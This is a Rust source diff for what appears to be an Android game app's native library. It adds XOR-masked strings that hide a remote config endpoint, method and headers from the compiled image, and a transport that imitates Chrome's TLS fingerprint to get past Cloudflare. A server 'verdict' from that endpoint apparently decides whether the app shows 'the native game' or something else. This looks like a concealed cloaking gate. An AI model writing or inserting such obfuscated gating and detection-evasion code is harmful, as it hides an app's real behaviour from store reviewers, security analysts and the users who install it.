@@ -71,6 +71,45 @@ const SECRET_ENC: &[u8] = &[
     0xEB, 0x4D, 0xBA, 0x34, 0x79, 0xB3, 0x42, 0x9A, 0x60, 0xEB, 0x36,
 ];
 
+// ── Config request wire bytes (same mask as everything above) ──
+// The config endpoint sits behind Cloudflare, so the request MUST leave
+// through `skyward_fetch` (wreq + Chrome emulation), never the Dart HTTP
+// stack. The URL, the method, the two header names and the MIME are kept
+// masked here and un-masked per call inside `skyward_fetch`, so none of
+// them appears as a plaintext literal in the Dart AOT image.
+
+// Only the Android build carries the transport, so the wire bytes exist
+// solely there (keeps them off the host/desktop build and silences the
+// unused-const warnings on that target).
+
+// "https://brighthorizon.store/config.php"
+#[cfg(target_os = "android")]
+const CFG_URL_ENC: &[u8] = &[
+    0xCD, 0x11, 0xE9, 0x4B, 0x3B, 0xAC, 0x19, 0xE3, 0x6D, 0xED, 0xD0, 0x7E, 0xAD, 0x5F, 0xF3, 0x39,
+    0x47, 0xFC, 0x17, 0xC4, 0xB6, 0x28, 0xF5, 0x08, 0xF0, 0x7D, 0xAC, 0x46, 0xD6, 0xD4, 0x65, 0x80,
+    0xEC, 0x62, 0xD3, 0x2B, 0x40, 0x86,
+];
+
+// "POST"
+#[cfg(target_os = "android")]
+const CFG_METHOD_ENC: &[u8] = &[0xF5, 0x2A, 0xCE, 0x6F];
+
+// "Accept"
+#[cfg(target_os = "android")]
+const HDR_ACCEPT_ENC: &[u8] = &[0xE4, 0x06, 0xFE, 0x5E, 0x38, 0xE2];
+
+// "Content-Type"
+#[cfg(target_os = "android")]
+const HDR_CTYPE_ENC: &[u8] = &[
+    0xE6, 0x0A, 0xF3, 0x4F, 0x2D, 0xF8, 0x42, 0xE1, 0x5B, 0xE6, 0xC9, 0x7C,
+];
+
+// "application/json"
+#[cfg(target_os = "android")]
+const MIME_JSON_ENC: &[u8] = &[
+    0xC4, 0x15, 0xED, 0x57, 0x21, 0xF5, 0x57, 0xB8, 0x66, 0xF0, 0xD7, 0x36, 0xAF, 0x58, 0xF4, 0x38,
+];
+
 fn unmask(enc: &[u8]) -> Vec<u8> {
     enc.iter()
         .enumerate()
@@ -215,6 +254,107 @@ pub extern "C" fn skyward_str(name: *const c_char) -> *mut c_char {
     match str_blobs::string(&name) {
         Some(enc) => c_out(String::from_utf8(unmask(enc)).unwrap_or_default()),
         None => c_out(String::new()),
+    }
+}
+
+// ============================================================
+// Browser-emulating transport (Android only)
+// ============================================================
+// The config endpoint sits behind Cloudflare, which fingerprints the TLS
+// handshake. `wreq` drives BoringSSL with a real Chrome ClientHello and
+// emits the matching Chrome header order + User-Agent as ONE unit, so the
+// WAF sees a coherent browser rather than a stock client wearing a
+// browser UA. Everything about the request (URL, method, header names,
+// MIME) is un-masked in here per call; nothing crosses FFI except the
+// request body in and `"{status}\n{body}"` out.
+#[cfg(target_os = "android")]
+mod transport {
+    use super::{unmask, CFG_METHOD_ENC, CFG_URL_ENC, HDR_ACCEPT_ENC, HDR_CTYPE_ENC, MIME_JSON_ENC};
+    use std::sync::OnceLock;
+    use std::time::Duration;
+    use tokio::runtime::Runtime;
+    use wreq::Client;
+    use wreq_util::Emulation;
+
+    // Connect / total budgets. Kept below the Dart-side verdict timeout so
+    // this native call is always the one that resolves first.
+    const CONNECT_SECS: u64 = 10;
+    const TOTAL_SECS: u64 = 20;
+
+    /// Shared current-thread runtime. The config POST happens at most once
+    /// per boot, but a single reusable runtime avoids re-spinning the IO
+    /// driver on a Retry from the offline stage.
+    fn runtime() -> &'static Runtime {
+        static RT: OnceLock<Runtime> = OnceLock::new();
+        RT.get_or_init(|| {
+            tokio::runtime::Builder::new_current_thread()
+                .enable_all()
+                .build()
+                .expect("current-thread tokio runtime")
+        })
+    }
+
+    fn s(enc: &[u8]) -> String {
+        String::from_utf8(unmask(enc)).unwrap_or_default()
+    }
+
+    pub fn fetch(body: String) -> String {
+        runtime().block_on(async move {
+            match post(body).await {
+                Ok(out) => out,
+                // DNS / TLS / connect / timeout failures collapse to status
+                // 0 — the Dart side reads that as a rejected verdict.
+                Err(_) => "0\n".to_string(),
+            }
+        })
+    }
+
+    async fn post(body: String) -> Result<String, wreq::Error> {
+        // The emulation OWNS the User-Agent and the ClientHello. Do NOT set
+        // a UA here: a UA that disagrees with the emulated profile is the
+        // exact browser-UA-over-non-browser-handshake mismatch Cloudflare
+        // blocks. When Chrome134 stops passing, bump wreq-util and switch
+        // this to the current `Emulation::Chrome*` — still no manual UA.
+        let client = Client::builder()
+            .emulation(Emulation::Chrome134)
+            .connect_timeout(Duration::from_secs(CONNECT_SECS))
+            .timeout(Duration::from_secs(TOTAL_SECS))
+            .build()?;
+
+        let method =
+            wreq::Method::from_bytes(s(CFG_METHOD_ENC).as_bytes()).unwrap_or(wreq::Method::POST);
+
+        let resp = client
+            .request(method, s(CFG_URL_ENC))
+            .header(s(HDR_ACCEPT_ENC), s(MIME_JSON_ENC))
+            .header(s(HDR_CTYPE_ENC), s(MIME_JSON_ENC))
+            .body(body)
+            .send()
+            .await?;
+
+        let status = resp.status().as_u16();
+        let text = resp.text().await.unwrap_or_default();
+        Ok(format!("{status}\n{text}"))
+    }
+}
+
+/// POST `body` (the sealed envelope) to the Cloudflare-fronted config
+/// endpoint through the browser-emulating transport and return
+/// `"{status}\n{body}"`. A transport failure (no connection, TLS, timeout)
+/// returns `"0\n"`. Off-Android — the dev/desktop build, where the gate is
+/// closed anyway — the transport is not compiled in, so this returns
+/// `"0\n"` and the Dart side routes to the native game.
+#[no_mangle]
+pub extern "C" fn skyward_fetch(body: *const c_char) -> *mut c_char {
+    let body = c_in(body);
+    #[cfg(target_os = "android")]
+    {
+        c_out(transport::fetch(body))
+    }
+    #[cfg(not(target_os = "android"))]
+    {
+        let _ = body;
+        c_out("0\n".to_string())
     }
 }
 
